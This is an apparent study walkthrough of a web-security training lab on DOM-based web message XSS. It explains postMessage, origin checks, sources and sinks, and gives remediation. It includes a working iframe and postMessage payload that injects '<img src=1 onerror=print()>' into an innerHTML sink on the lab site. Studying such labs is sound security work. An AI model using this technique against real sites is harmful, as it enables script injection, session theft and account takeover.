# 🧠Lab-1 DOM-Based Web Message Vulnerabilities

---

## 📖 Overview

```txt
A DOM-based web message vulnerability happens when:

Attacker-controlled web message
        ↓
received by page
        ↓
passed into dangerous sink
        ↓
JavaScript executes
```

This is basically:

```txt
postMessage() + unsafe JavaScript handling
```

---

# 🌐 What Is a Web Message?

Modern browsers allow:

```txt
tabs
iframes
popups
windows
```

to communicate with each other using:

```javascript
postMessage()
```

---

# 🧩 Why Browsers Need This

Websites often embed:

```txt
payment popups
login popups
ads
widgets
iframes
external apps
```

Example:

```txt
Main website
    ↓
opens payment popup
    ↓
popup sends:
"payment successful"
```

without reloading page.

---

# 🏦 Real-Life Example

Imagine:

```txt
bank.com
```

opens:

```txt
payment-provider.com
```

popup.

After payment:

```javascript
window.opener.postMessage("paid", "*")
```

Main page receives:

```txt
"paid"
```

and updates UI.

---

# 🛡️ Same-Origin Policy (SOP)

Normally:

```txt
One website cannot directly access another website's data.
```

Example:

```txt
evil.com
```

cannot read:

```txt
gmail.com
```

DOM.

This protection is called:

```txt
Same-Origin Policy
```

---

# ⚠️ But postMessage() Is Special

Browser intentionally allows communication through:

```javascript
postMessage()
```

because websites need it.

But:

```txt
developer must verify sender safely

otherwise attacker can send malicious data
```

---

# 🔄 Basic Web Message Flow

```txt
Page A
   ↓ postMessage()
Page B
   ↓ receives event
event.data contains message
```

---

# 📦 Message Event Object

When page receives message:

```javascript
window.addEventListener("message", function(e){
```

Browser creates:

```txt
e
```

called:

```txt
Event Object
```

---

# 🔑 Important Properties

## 📨 e.data

Actual message.

Example:

```txt
"hello"
```

or:

```html
"<img onerror=alert(1)>"
```

---

## 🌍 e.origin

Who sent message.

Example:

```txt
https://trusted-site.com
```

---

# 🎯 Source and Sink

---

## 📥 Source

Attacker-controlled input.

Common source here:

```javascript
e.data
```

because attacker controls message.

---

## 💣 Sink

Dangerous function.

Examples:

```javascript
innerHTML
eval()
document.write()
location=
```

---

# 🚨 Vulnerability Condition

```txt
Attacker controls source
        ↓
website passes into sink unsafely
        ↓
DOM vulnerability
```

---

# ❌ Vulnerable Example

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```

---

# ⚠️ Why Vulnerable?

Because:

```javascript
innerHTML
```

parses HTML.

If attacker sends:

```html
<img src=1 onerror=alert(1)>
```

browser executes JS.

---

# 🧪 Lab Walkthrough — Official Lab

---

## 🎯 Goal

Trigger:

```javascript
print()
```

using web messages.

---

# 🚀 Step 1 — Open Lab

Open lab homepage.

---

# 🔍 Step 2 — Inspect Source

View source or inspect scripts.

You find:

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

---

# 📸 Screenshot — Vulnerable Source Code

```txt
File: DOM-Based-Web-Message-Vuln-Source.png
```

![Vulnerable Source Code](../images/dom-based-web-message-source.png)

---

# 🧠 Step 3 — Analyze Vulnerability

## 📥 Source

```javascript
e.data
```

User-controlled web message.

---

## 💣 Sink

```javascript
innerHTML
```

Dangerous HTML sink.

---

# 🌐 Step 4 — Go To Exploit Server

Click:

```txt
Go to exploit server
```

---

# 💥 Step 5 — Paste Payload

Inside BODY:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

Replace:

```txt
YOUR-LAB-ID
```

with lab URL.

---

# 🔬 Payload Breakdown

---

## 🪟 Part 1 — iframe

```html
<iframe src="https://lab-id.net">
```

Loads vulnerable website.

---

## ⚡ Part 2 — onload

```javascript
onload=""
```

Runs JS after iframe fully loads.

---

## 🧭 Part 3 — contentWindow

```javascript
this.contentWindow
```

Access iframe's browser window.

---

## 📨 Part 4 — postMessage()

```javascript
postMessage(payload, "*")
```

Sends message into iframe page.

---

## ☠️ Part 5 — Payload

```html
<img src=1 onerror=print()>
```

This becomes:

```javascript
e.data
```

inside vulnerable page.

---

## 💣 Part 6 — innerHTML

Vulnerable page does:

```javascript
innerHTML = e.data
```

Browser creates:

```html
<img src=1 onerror=print()>
```

inside DOM.

---

## 🚨 Part 7 — Trigger Execution

```javascript
src=1
```

invalid image.

Image loading fails.

Browser triggers:

```javascript
onerror
```

which executes:

```javascript
print()
```

---

## 🌍 Part 8 — *

```txt
"*"
```

means:

```txt
allow all origins
```

No restriction.

---

# 💾 Step 6 — Store Exploit

Click:

```txt
Store
```

---

# 📤 Step 7 — Deliver Exploit

Click:

```txt
Deliver exploit to victim
```

Lab solved.

---

# 🔄 Complete Attack Flow

```txt
Victim opens exploit page
        ↓
Exploit page loads iframe
        ↓
iframe loads vulnerable website
        ↓
onload executes
        ↓
postMessage sends malicious HTML
        ↓
website receives message
        ↓
message stored in e.data
        ↓
innerHTML inserts payload into DOM
        ↓
browser parses malicious HTML
        ↓
onerror executes
        ↓
print() executes
```

---

# 🧠 Mental Model

```txt
Attacker sends malicious message →
website trusts message →
website injects message into HTML →
browser executes JavaScript
```

---

# 📚 Important Concepts

## 📨 postMessage()

Cross-window communication API.

---

## 📩 addEventListener("message")

Receives web messages.

---

## 📦 e.data

Actual message contents.

---

## 🌍 e.origin

Sender origin.

Example:

```txt
https://trusted-site.com
```

---

# ☠️ Common Dangerous Sinks

```javascript
innerHTML
outerHTML
eval()
document.write()
location=
setTimeout()
setInterval()
```

---

# 📥 Common Sources

```javascript
e.data
location.search
location.hash
document.cookie
document.referrer
localStorage
sessionStorage
```

---

# ❗ Why This Happens

Developers trust:

```javascript
e.data
```

without validation.

---

# ✅ Safe Code

```javascript
window.addEventListener("message", function(e){

   if(e.origin !== "https://trusted-site.com"){
      return;
   }

   document.getElementById("ads").innerText = e.data;

});
```

---

# 🛡️ Why innerText Is Safer

```javascript
innerText
```

shows text only.

Does NOT parse HTML.

---

# ❌ Dangerous Version

```javascript
innerHTML
```

parses HTML and executes events.

---

# 🌍 Real-World Impact

Can lead to:

```txt
DOM XSS
session theft
account takeover
phishing
admin compromise
token theft
malware delivery
```

---

# 🎯 High-Value Real Targets

Often found in:

```txt
ad systems
payment popups
OAuth login windows
embedded widgets
customer support chats
analytics dashboards
cross-domain iframes
```

---

# 🚩 Red Flags During Testing

Look for:

```javascript
addEventListener("message")
```

Then check:

```txt
Is origin verified?
Is e.data sanitized?
Is dangerous sink used?
```

---

# 🛠️ Browser DevTools Tip

You can search all JS for:

```javascript
postMessage
```

or:

```javascript
addEventListener("message")
```

inside:

```txt
Sources tab
```

---

# 🔐 Remediation

## 1️⃣ Verify Origin

```javascript
if(e.origin !== "https://trusted-site.com")
   return;
```

---

## 2️⃣ Avoid Dangerous Sinks

Avoid:

```javascript
innerHTML
eval()
document.write()
```

---

## 3️⃣ Sanitize Data

Use safe sanitization libraries.

---

## 4️⃣ Use innerText

Instead of:

```javascript
innerHTML
```

---

# 🏁 Final One-Line Summary

```txt
DOM-based web message vulnerabilities happen when attacker-controlled messages are received through postMessage() and inserted into dangerous JavaScript or HTML sinks without proper validation.
```
